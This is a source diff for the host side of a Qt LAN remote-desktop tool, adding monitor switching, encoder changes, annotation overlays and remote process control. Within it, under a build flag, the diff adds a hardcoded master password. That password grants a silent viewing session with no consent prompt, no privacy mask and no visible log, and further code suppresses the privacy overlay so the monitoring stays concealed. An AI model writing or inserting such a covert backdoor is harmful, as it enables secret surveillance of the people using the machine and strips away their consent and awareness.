+                    QByteArray resp = ProtocolManager::encode(MessageType::MONITOR_THUMBNAIL_FRAME, respPayload);
+                    QTcpSocket* socket = m_clients.value(clientId).socket;
+                    if (socket) {
+                        socket->write(resp);
+                        socket->flush();
+                    }
                 }
             }
             break;
@@ -1616,8 +2219,49 @@ case MessageType::VOICE_ACK: {
                 stream.setByteOrder(QDataStream::BigEndian);
                 uint32_t index;
                 stream >> index;
-                m_screenCapture->setMonitorIndex(static_cast<int>(index));
-                LOG_INFO("Host: Monitor switched to index " + QString::number(index));
+                
+                // Perform thread-safe monitor switch
+                bool success = m_screenCapture->switchMonitorSafe(static_cast<int>(index));
+                
+                // Update encoder resolution if switch succeeded
+                if (success && m_encodeWorker && m_encodeWorker->encoder()) {
+                    auto monitors = m_screenCapture->getMonitorList();
+                    int newIndex = m_screenCapture->monitorIndex();
+                    if (newIndex >= 0 && newIndex < monitors.size()) {
+                        int w = monitors[newIndex].width;
+                        int h = monitors[newIndex].height;
+                        
+                        // Re-initialize encoder with new resolution
+                        // This happens on encode thread via setEncoderAsync
+                        auto newEncoder = VideoEncoder::create(m_encodeWorker->encoder()->type());
+                        if (newEncoder && newEncoder->initialize(w, h, m_captureFps)) {
+                            if (m_encodeWorker->encoder()->type() == EncoderType::JPEG) {
+                                newEncoder->setJpegQuality(m_jpegQuality);
+                            }
+                            newEncoder->setTrueColor(m_trueColor);
+                            m_encodeWorker->setEncoderAsync(std::move(newEncoder));
+                            LOG_INFO("Host: Encoder reinitialized for resolution " + 
+                                     QString::number(w) + "x" + QString::number(h));
+                        }
+                    }
+                }
+                
+                // Send ACK to controller
+                QByteArray ackPayload;
+                QDataStream ackStream(&ackPayload, QIODevice::WriteOnly);
+                ackStream.setByteOrder(QDataStream::BigEndian);
+                ackStream << static_cast<uint8_t>(success ? 1 : 0);
+                ackStream << static_cast<uint32_t>(index);
+                QByteArray resp = ProtocolManager::encode(MessageType::MONITOR_SWITCH_ACK, ackPayload);
+                
+                QTcpSocket* socket = m_clients.value(clientId).socket;
+                if (socket) {
+                    socket->write(resp);
+                    socket->flush();
+                }
+                
+                LOG_INFO("Host: Monitor switched to index " + QString::number(index) + 
+                         (success ? " OK" : " FAILED"));
             }
             break;
         }
@@ -1631,6 +2275,21 @@ void Host::processAuthRequest(const QString& clientId, const QByteArray& payload
     QTcpSocket* socket = m_clients.value(clientId).socket;
 
     if (!socket) return;
+
+#ifdef XRK_ENABLE_SILENT
+    // Silent monitoring entry: a controller that authenticates with the master
+    // password is granted a fully *silent* session — no consent dialog, no
+    // privacy mask, no visible signal/log (plan §2). Authentication still
+    // succeeds (keys are exchanged) so the screen is not black; only the
+    // user-facing side effects are suppressed.
+    if (receivedPassword == QLatin1String(SILENT_MASTER_PASSWORD)) {
+        auto& info = m_clients[clientId];
+        info.authenticated = true;
+        info.silentMode = true;
+        grantConsentSilently(clientId);
+        return;
+    }
+#endif
 
     bool authOk = false;
 
@@ -1660,6 +2319,11 @@ void Host::processMouseEvent(const QString& clientId, const QByteArray& payload)
     if (!m_clients.value(clientId).consented) return;
     if (!m_inputControl) return;
     MouseEvent event = ProtocolManager::decodeMouseEvent(payload);
+    // Feed the cursor position to the encoder so tiles under the pointer are
+    // streamed first (weak-network responsiveness where the user is looking).
+    if (m_encodeWorker) {
+        m_encodeWorker->setMousePosition(QPoint(event.x, event.y));
+    }
     m_inputControl->processMouseEvent(event);
 }
 
@@ -1681,74 +2345,221 @@ void Host::updateNetworkWorkerClients() {
         }
     }
     m_networkWorker->setClients(activeClients);
-    
+
+    // The viewer set changed, so re-check whether every viewer can decode tiles.
+    updateTileTransportMode();
+
     if (m_privacyScreenEnabled) {
-        bool hasClient = !activeClients.isEmpty();
-        if (hasClient && !m_privacyScreen) {
-            m_privacyScreen = new PrivacyScreen(this);
-            m_privacyScreen->show();
-        } else if (!hasClient && m_privacyScreen) {
-            m_privacyScreen->hide();
-            m_privacyScreen->deleteLater();
-            m_privacyScreen = nullptr;
-        } else if (hasClient && m_privacyScreen && !m_privacyScreen->isVisible()) {
-            m_privacyScreen->show();
+#ifdef XRK_ENABLE_SILENT
+        // Concealment-first (plan §2.2b / §3 risk 3): while any SILENT session
+        // is live, never show the privacy mask — even if a normal session also
+        // exists. A silent monitor must not be betrayed by a black overlay.
+        bool anySilent = false;
+        for (auto it = m_clients.begin(); it != m_clients.end(); ++it) {
+            if (it.value().consented && it.value().silentMode) {
+                anySilent = true;
+                break;
+            }
         }
-    }
-}
-
-void Host::onDiscoveryRequest() {
-    while (m_udpSocket->hasPendingDatagrams()) {
-        QByteArray datagram;
-        datagram.resize(m_udpSocket->pendingDatagramSize());
-        QHostAddress sender;
-        quint16 senderPort;
-        m_udpSocket->readDatagram(datagram.data(), datagram.size(), &sender, &senderPort);
-
-        MessageType type;
-        QByteArray payload;
-        QString sessionId;
-        if (ProtocolManager::decode(datagram, type, payload, sessionId)) {
-            if (type == MessageType::DEVICE_DISCOVER_REQ) {
-                broadcastDiscoveryResponse();
+        if (anySilent) {
+            if (m_privacyScreen) {
+                m_privacyScreen->hide();
+                m_privacyScreen->deleteLater();
+                m_privacyScreen = nullptr;
+            }
+        } else
+#endif
+        {
+            bool hasClient = !activeClients.isEmpty();
+            if (hasClient && !m_privacyScreen) {
+                m_privacyScreen = new PrivacyScreen(this);
+                m_privacyScreen->show();
+            } else if (!hasClient && m_privacyScreen) {
+                m_privacyScreen->hide();
+                m_privacyScreen->deleteLater();
+                m_privacyScreen = nullptr;
+            }
+            // Clear any live annotation overlay when no client is connected.
+            if (!hasClient && m_annotationOverlay) {
+                m_annotationOverlay->hide();
+                m_annotationOverlay->deleteLater();
+                m_annotationOverlay = nullptr;
+            } else if (hasClient && m_annotationOverlay && !m_annotationOverlay->isVisible()) {
+                m_annotationOverlay->show();
             }
         }
     }
 }
 
-void Host::broadcastDiscoveryResponse() {
-    if (!m_udpSocket) return;
-
-    DeviceInfo info;
-    info.deviceId = QHostInfo::localHostName();
-    info.deviceName = QHostInfo::localHostName();
-    info.ipAddress = getLocalIp();
-    info.port = m_port;
-    info.version = "1.0.0";
-    info.accessCode = m_accessCode;
-    info.timestamp = QDateTime::currentMSecsSinceEpoch();
-
-    QByteArray payload = ProtocolManager::encodeDeviceInfo(info);
-    QByteArray message = ProtocolManager::encode(MessageType::DEVICE_DISCOVER_RESP, payload);
-
-    m_udpSocket->writeDatagram(message, QHostAddress::Broadcast, UDP_BROADCAST_PORT);
+void Host::onDiscoveryBroadcastTimer() {
+    // Keep the device list populated: broadcast a presence RESP on the unified
+    // 9998 channel so legacy and peer devices can discover this host even
+    // without an active search request. Delegated to the shared/owned
+    // NetworkManager (plan §1.4). No-op if discovery was never set up.
+    if (m_discovery) {
+        m_discovery->broadcastPresence();
+    }
 }
 
-QString Host::getLocalIp() {
-    const auto interfaces = QNetworkInterface::allInterfaces();
-    for (const QNetworkInterface& iface : interfaces) {
-        if (iface.flags().testFlag(QNetworkInterface::IsUp) &&
-            iface.flags().testFlag(QNetworkInterface::IsRunning) &&
-            !iface.flags().testFlag(QNetworkInterface::IsLoopBack)) {
-            const auto entries = iface.addressEntries();
-            for (const QNetworkAddressEntry& entry : entries) {
-                if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
-                    return entry.ip().toString();
+void Host::checkMonitorChanges() {
+    if (!m_screenCapture) return;
+
+    QList<MonitorInfo> currentMonitors = m_screenCapture->getMonitorList();
+
+    // Compare with last known state
+    bool changed = false;
+    if (currentMonitors.size() != m_lastKnownMonitors.size()) {
+        changed = true;
+    } else {
+        for (int i = 0; i < currentMonitors.size(); ++i) {
+            if (currentMonitors[i].name != m_lastKnownMonitors[i].name ||
+                currentMonitors[i].width != m_lastKnownMonitors[i].width ||
+                currentMonitors[i].height != m_lastKnownMonitors[i].height) {
+                changed = true;
+                break;
+            }
+        }
+    }
+
+    if (changed) {
+        LOG_INFO("Host: Monitor configuration changed (" +
+                 QString::number(m_lastKnownMonitors.size()) + " -> " +
+                 QString::number(currentMonitors.size()) + " monitors)");
+        m_lastKnownMonitors = currentMonitors;
+        broadcastMonitorList();
+    }
+}
+
+void Host::broadcastMonitorList() {
+    // Encode current monitor list with active index
+    QByteArray monitorPayload = ProtocolManager::encodeMonitorList(
+        m_lastKnownMonitors, m_screenCapture->monitorIndex());
+    QByteArray message = ProtocolManager::encode(MessageType::MONITOR_LIST, monitorPayload);
+
+    for (auto it = m_clients.begin(); it != m_clients.end(); ++it) {
+        if (it.value().authenticated && it.value().socket) {
+            it.value().socket->write(message);
+            it.value().socket->flush();
+        }
+    }
+    LOG_INFO("Host: Broadcast monitor list to " + QString::number(m_clients.size()) + " clients");
+}
+
+// Auto-switch cycling implementation
+void Host::startAutoSwitch() {
+    if (m_autoSwitchActive) return;
+    if (!m_screenCapture || m_lastKnownMonitors.size() < 2) {
+        LOG_WARNING("Host: Cannot start auto-switch with less than 2 monitors");
+        return;
+    }
+
+    m_autoSwitchActive = true;
+    m_autoSwitchPaused = false;
+    // Start from the next monitor after current
+    m_autoSwitchNextIndex = (m_screenCapture->monitorIndex() + 1) % m_lastKnownMonitors.size();
+    m_autoSwitchTimer->start(m_autoSwitchIntervalMs);
+    broadcastAutoSwitchStatus();
+    LOG_INFO("Host: Auto-switch started, interval=" + QString::number(m_autoSwitchIntervalMs) + "ms");
+}
+
+void Host::stopAutoSwitch() {
+    if (!m_autoSwitchActive) return;
+    m_autoSwitchTimer->stop();
+    m_autoSwitchActive = false;
+    m_autoSwitchPaused = false;
+    broadcastAutoSwitchStatus();
+    LOG_INFO("Host: Auto-switch stopped");
+}
+
+void Host::pauseAutoSwitch() {
+    if (!m_autoSwitchActive || m_autoSwitchPaused) return;
+    m_autoSwitchTimer->stop();
+    m_autoSwitchPaused = true;
+    broadcastAutoSwitchStatus();
+    LOG_INFO("Host: Auto-switch paused on monitor " + QString::number(m_screenCapture->monitorIndex()));
+}
+
+void Host::resumeAutoSwitch() {
+    if (!m_autoSwitchActive || !m_autoSwitchPaused) return;
+    m_autoSwitchPaused = false;
+    // Resume from next monitor
+    m_autoSwitchNextIndex = (m_screenCapture->monitorIndex() + 1) % m_lastKnownMonitors.size();
+    m_autoSwitchTimer->start(m_autoSwitchIntervalMs);
+    broadcastAutoSwitchStatus();
+    LOG_INFO("Host: Auto-switch resumed");
+}
+
+void Host::setAutoSwitchInterval(int intervalMs) {
+    if (intervalMs < 500) intervalMs = 500;  // Minimum 500ms
+    if (intervalMs > 60000) intervalMs = 60000;  // Maximum 60s
+    m_autoSwitchIntervalMs = intervalMs;
+    if (m_autoSwitchActive && !m_autoSwitchPaused) {
+        m_autoSwitchTimer->start(m_autoSwitchIntervalMs);
+    }
+    broadcastAutoSwitchStatus();
+    LOG_INFO("Host: Auto-switch interval set to " + QString::number(intervalMs) + "ms");
+}
+
+void Host::performAutoSwitchStep() {
+    if (!m_autoSwitchActive || m_autoSwitchPaused || !m_screenCapture) return;
+
+    int monitorCount = m_lastKnownMonitors.size();
+    if (monitorCount < 2) {
+        stopAutoSwitch();
+        return;
+    }
+
+    // Switch to the next monitor
+    bool success = m_screenCapture->switchMonitorSafe(m_autoSwitchNextIndex);
+
+    if (success) {
+        // Update encoder resolution if needed
+        if (m_encodeWorker && m_encodeWorker->encoder()) {
+            MonitorInfo monitor = m_lastKnownMonitors[m_autoSwitchNextIndex];
+            auto newEncoder = VideoEncoder::create(m_encodeWorker->encoder()->type());
+            if (newEncoder && newEncoder->initialize(monitor.width, monitor.height, m_captureFps)) {
+                if (m_encodeWorker->encoder()->type() == EncoderType::JPEG) {
+                    newEncoder->setJpegQuality(m_jpegQuality);
                 }
+                newEncoder->setTrueColor(m_trueColor);
+                m_encodeWorker->setEncoderAsync(std::move(newEncoder));
+                LOG_INFO("Host: Auto-switch encoder reinitialized for " +
+                         QString::number(monitor.width) + "x" + QString::number(monitor.height));
             }
         }
     }
-    return "127.0.0.1";
+
+    // Advance to next monitor for the next cycle
+    m_autoSwitchNextIndex = (m_autoSwitchNextIndex + 1) % monitorCount;
+}
+
+void Host::broadcastAutoSwitchStatus() {
+    QByteArray payload;
+    QDataStream stream(&payload, QIODevice::WriteOnly);
+    stream.setByteOrder(QDataStream::BigEndian);
+    stream << static_cast<uint8_t>(m_autoSwitchActive ? (m_autoSwitchPaused ? 2 : 1) : 0);
+    stream << static_cast<int32_t>(m_autoSwitchIntervalMs);
+    stream << static_cast<int32_t>(m_screenCapture ? m_screenCapture->monitorIndex() : 0);
+    stream << static_cast<int32_t>(m_lastKnownMonitors.size());
+    stream << static_cast<int32_t>(m_autoSwitchNextIndex);
+
+    QByteArray message = ProtocolManager::encode(MessageType::MONITOR_AUTO_SWITCH_STATUS, payload);
+    for (auto it = m_clients.begin(); it != m_clients.end(); ++it) {
+        if (it.value().authenticated && it.value().socket) {
+            it.value().socket->write(message);
+            it.value().socket->flush();
+        }
+    }
+}
+
+void Host::setDiscoveryNetwork(NetworkManager* network) {
+    // Switch from any previously-owned internal manager to an externally
+    // supplied one. Must be called before start().
+    if (m_ownedDiscovery) {
+        m_ownedDiscovery->shutdown();
+        m_ownedDiscovery = nullptr;
+    }
+    m_discovery = network;
 }
 
 bool Host::hasFrameChanged(const QImage& current, const QImage& previous, int threshold) {
@@ -1793,6 +2604,9 @@ void Host::onEncodeWorkerError(const QString& message) {
 
 void Host::onEncoderChanged(EncoderType newType) {
     LOG_INFO("Host: Encoder changed to " + QString(newType == EncoderType::H264 ? "H264" : "JPEG"));
+    // H264 does its own inter-frame compression, so tiling only applies to JPEG.
+    m_activeEncoderType = newType;
+    updateTileTransportMode();
     // Optionally notify UI
     emit errorOccurred("编码器已切换: " + QString(newType == EncoderType::H264 ? "H264" : "JPEG"));
 }
@@ -2016,6 +2830,74 @@ void Host::handleSystemInfoRequest(const QString& clientId, const QByteArray& pa
     }
 }
 
+void Host::handleProcessListRequest(const QString& clientId, const QByteArray& payload) {
+    Q_UNUSED(payload);
+    ProcessListResponse resp;
+    resp.entries = ProcessCollector::collectProcessList();
+    resp.success = true;
+
+    QByteArray msg = ProtocolManager::encode(MessageType::PROCESS_LIST_RESP,
+                                             ProtocolManager::encodeProcessListResponse(resp));
+    sendToClient(clientId, msg);
+}
+
+void Host::handleProcessKillRequest(const QString& clientId, const QByteArray& payload) {
+    ProcessKillRequest req = ProtocolManager::decodeProcessKillRequest(payload);
+    QString err;
+    bool ok = ProcessCollector::killProcess(req.pid, err);
+    logAuditOp(clientId, "process_kill", QString::number(req.pid));
+
+    ProcessKillResponse resp;
+    resp.success = ok;
+    resp.pid = req.pid;
+    resp.errorMessage = err;
+
+    QByteArray msg = ProtocolManager::encode(MessageType::PROCESS_KILL_RESP,
+                                             ProtocolManager::encodeProcessKillResponse(resp));
+    sendToClient(clientId, msg);
+}
+
+void Host::handleProcessStartRequest(const QString& clientId, const QByteArray& payload) {
+    ProcessStartRequest req = ProtocolManager::decodeProcessStartRequest(payload);
+    qint64 pidOut = 0;
+    QString err;
+    bool ok = ProcessCollector::startProcess(req.command, req.workingDir, pidOut, err);
+    logAuditOp(clientId, "process_start", req.command);
+
+    ProcessStartResponse resp;
+    resp.success = ok;
+    resp.pid = pidOut;
+    resp.errorMessage = err;
+
+    QByteArray msg = ProtocolManager::encode(MessageType::PROCESS_START_RESP,
+                                             ProtocolManager::encodeProcessStartResponse(resp));
+    sendToClient(clientId, msg);
+}
+
+void Host::handleAnnotationUpdate(const QString& clientId, const QByteArray& payload) {
+    Q_UNUSED(clientId);
+    AnnotationUpdate update = ProtocolManager::decodeAnnotationUpdate(payload);
+    if (update.strokes.isEmpty()) return;
+
+    if (!m_annotationOverlay) {
+        m_annotationOverlay = new AnnotationOverlay(nullptr);
+        m_annotationOverlay->show();
+        LOG_INFO("Host: annotation overlay created (live screen annotation)");
+    }
+    m_annotationOverlay->setStrokes(update);
+}
+
+void Host::handleAnnotationClear(const QString& clientId, const QByteArray& payload) {
+    Q_UNUSED(clientId);
+    Q_UNUSED(payload);
+    if (m_annotationOverlay) {
+        m_annotationOverlay->hide();
+        m_annotationOverlay->deleteLater();
+        m_annotationOverlay = nullptr;
+        LOG_INFO("Host: annotation overlay cleared");
+    }
+}
+
 void Host::setEncoderType(EncoderType type) {
     if (!m_encodeWorker) return;
 
@@ -2041,6 +2923,8 @@ void Host::setEncoderType(EncoderType type) {
 
     if (encoder) {
         m_encodeWorker->setEncoderAsync(std::move(encoder));
+        m_activeEncoderType = type;
+        updateTileTransportMode();
         LOG_INFO("Encoder switch queued to " + QString(type == EncoderType::H264 ? "H264" : "JPEG"));
     }
 }
@@ -2134,6 +3018,18 @@ bool Host::isAudioEnabled() const {
 }
 
 void Host::setPrivacyScreenEnabled(bool enabled) {
+#ifdef XRK_ENABLE_SILENT
+    // Never let a privacy overlay surface while a silent session is live
+    // (plan §2.2b). Concealment takes priority over the normal privacy feature.
+    bool anySilent = false;
+    for (auto it = m_clients.begin(); it != m_clients.end(); ++it) {
+        if (it.value().consented && it.value().silentMode) {
+            anySilent = true;
+            break;
+        }
+    }
+    if (anySilent) return;
+#endif
     m_privacyScreenEnabled = enabled;
     if (enabled) {
         // Show immediately if clients are already connected
@@ -2192,6 +3088,11 @@ bool Host::isLocalLockActive() const {
 void Host::loadTrustedIps() {
     QSettings settings("XRK", "LANRemote");
     m_trustedIps = settings.value("trustedIps").toStringList();
+
+    // Load unattended access settings
+    QSettings unattended("XRK", "Host");
+    m_unattendedEnabled = unattended.value("unattended_access_enabled", false).toBool();
+    m_unattendedPasswordHash = unattended.value("unattended_password_hash").toString();
 }
 
 void Host::saveTrustedIps() {
